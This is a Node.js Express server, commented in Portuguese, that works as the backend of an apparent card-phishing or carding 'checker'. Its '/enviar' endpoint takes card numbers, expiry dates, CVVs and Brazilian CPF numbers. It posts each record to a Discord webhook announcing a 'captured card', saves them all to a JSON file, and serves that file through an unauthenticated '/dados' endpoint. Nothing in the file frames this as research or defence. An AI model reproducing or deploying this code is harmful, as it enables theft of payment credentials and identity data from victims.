const express = require('express');
const fs = require('fs');
const path = require('path');
const axios = require('axios');
require('dotenv').config();

const app = express();
const PORT = process.env.PORT || 5000;

app.use(express.json());
app.use(express.static('public'));

app.post('/enviar', async (req, res) => {
  const { numero, validade, cvv, cpf } = req.body;
  console.log('Recebido para envio:', { numero, validade, cvv, cpf });

  const novo = {
    numero: String(numero || ''),
    validade: String(validade || ''),
    cvv: String(cvv || ''),
    cpf: String(cpf || ''),
    data: new Date().toLocaleString('pt-BR', { timeZone: 'America/Sao_Paulo' })
  };

  // Envio para o Discord
  const webhookUrl = process.env.DISCORD_WEBHOOK_URL;
  console.log('Webhook URL presente:', !!webhookUrl);

  if (webhookUrl) {
    try {
      const response = await axios.post(webhookUrl, {
        content: "@everyone 🚀 **Novo Cartão Capturado!**",
        embeds: [{
          title: "💳 Detalhes do Checker",
          color: 15105570, // Laranja vibrante
          fields: [
            { name: "🔢 Número do Cartão", value: `\`${novo.numero}\``, inline: false },
            { name: "📅 Validade", value: `\`${novo.validade}\``, inline: true },
            { name: "🔒 CVV", value: `\`${novo.cvv}\``, inline: true },
            { name: "👤 CPF", value: `\`${novo.cpf}\``, inline: false },
            { name: "⏰ Data/Hora", value: novo.data, inline: false }
          ],
          footer: { text: "Sistema de Monitoramento Checker" },
          timestamp: new Date().toISOString()
        }]
      });
      console.log('Resposta do Discord:', response.status);
    } catch (error) {
      console.error('ERRO DETALHADO DISCORD:', error.response ? error.response.data : error.message);
    }
  } else {
    console.error('ERRO: DISCORD_WEBHOOK_URL não configurada no Replit Secrets');
  }

  // Mantém backup no JSON
  let lista = [];
  const dbPath = path.join(__dirname, 'dados.json');
  
  if (fs.existsSync(dbPath)) {
    try {
      lista = JSON.parse(fs.readFileSync(dbPath, 'utf8'));
    } catch (e) {
      lista = [];
    }
  }

  lista.push(novo);
  fs.writeFileSync(dbPath, JSON.stringify(lista, null, 2));

  res.json({ message: 'Dados processados' });
});

app.get('/dados', (req, res) => {
  const dbPath = path.join(__dirname, 'dados.json');
  if (fs.existsSync(dbPath)) {
    try {
      const data = fs.readFileSync(dbPath, 'utf8');
      res.header("Content-Type", "application/json");
      res.send(data);
    } catch (e) {
      res.status(500).json({ error: 'Erro ao ler os dados' });
    }
  } else {
    res.json([]);
  }
});

app.listen(PORT, '0.0.0.0', () => {
  console.log(`Servidor ligado na porta ${PORT}`);
});
